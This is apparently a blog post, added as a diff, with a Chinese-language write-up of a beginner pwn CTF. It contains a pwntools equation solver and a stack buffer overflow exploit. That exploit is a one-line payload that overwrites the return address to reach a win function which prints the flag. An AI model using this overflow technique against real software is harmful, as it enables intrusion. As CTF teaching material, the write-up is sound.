@@ -1,0 +1,106 @@
+---
+layout: post
+title:  "Pwn CTF Writeup"
+date:   2021-01-29 14:41:44 +0800
+tags: CTF Writeup
+color: rgb(255,90,90)
+cover: '/assets/pwn-ctf/cover.png'
+subtitle: 'Pwn-CTF Writeup'
+---
+**Intro：**
+  : 一個高中生的CTF練習 剛好是我想要學習的PWN所以就跟著高中生一起嗨ＯＵＯ
+  : 由於過了一段時間，所以題目順序就～隨性
+
+**Problems：**
+- TOC
+{:toc}
+
+# Math Teacher
+[**Source File**](/assets/pwn-ctf/math-teacher/source){:target="_blank"}
+
+## Discription
+{: .no_toc}
+- 這題簡單的考你會不會用 pwntools 
+- 問100題二元一次方程式，解完就有FLAG
+
+## Solution
+{: .no_toc}
+- 用克拉馬公式
+
+``` python
+def cal():
+    f1 = r.recvline()
+    f2 = r.recvline()
+
+    print("Function 1: ", f1)
+    print("Function 2: ", f2)
+
+    a1 = int(f1[:f1.find(b'x')-3])
+    b1 = int(f1[f1.find(b'+')+1:f1.find(b'y')-3])
+    c1 = int(f1[f1.find(b'=')+1:])
+
+    a2 = int(f2[:f2.find(b'x')-3])
+    b2 = int(f2[f2.find(b'+')+1:f2.find(b'y')-3])
+    c2 = int(f2[f2.find(b'=')+1:])
+
+    delta = a1*b2-a2*b1
+
+    if delta == 0:
+        x = 0
+        y = int(c1/b1)
+    else:
+        x = int((c1*b2-b1*c2)/delta)
+        y = int((a1*c2-c1*a2)/delta)
+
+    r.recvuntil('= ')
+    r.sendline(str(x))
+    r.recvuntil('= ')
+    r.sendline(str(y))
+```
+
+# Go Home
+[**Source File**](/assets/pwn-ctf/go-home/source){:target="_blank"}
+
+## Discription 
+{: .no_toc}
+- 先是問你有沒有 Home
+
+  ```shell
+  Billy want to go home now.
+  Do you know the address of his house ?
+  ```
+- SourceFile 又有給 Home
+
+  ``` c
+  void Billyshouse(){
+    system("cat /home/ctf/flag");
+  }
+  ```
+
+- `<main>` 的 stack長度 `<` gets 能輸入的長度
+    ![](/assets/pwn-ctf/go-home/discription-0.png)
+
+\* 0x20 < $$\infty$$ (gets 輸入長度沒有限制)
+{: .notify}
+
+## Solution
+{: .no_toc}
+- 簡單的 **Bof** 蓋過 `<main>` 的 `ret`
+
+這邊有兩個要注意的地方
+{: .notify}
+  1. ubuntu 20 以後的 stack 對齊
+    : 就是蓋過 `ret` 之後跳進 function 裡面的時候stack結尾必須是0x0不能是0x8
+  2. `gets` 預設從 `$rbp - 0x20` 開始跳
+    : 也就是 ```OFFSET = 0x20 + 0x8```{: .language-ruby}
+
+## Payload
+{: .no_toc}
+- 1.要跳過的方法有很多，最簡單的就是不要跑 [**Function Prologue**](https://en.wikipedia.org/wiki/Function_prologue) 讓 stack 多了 `0x8` 就好
+- 直接跳到 `0x4006ca` 就好
+
+```python
+payload = b'A'*0x28 + p64(exe.symbols['Billyshouse']+0x4)
+```
+
+# To be done...
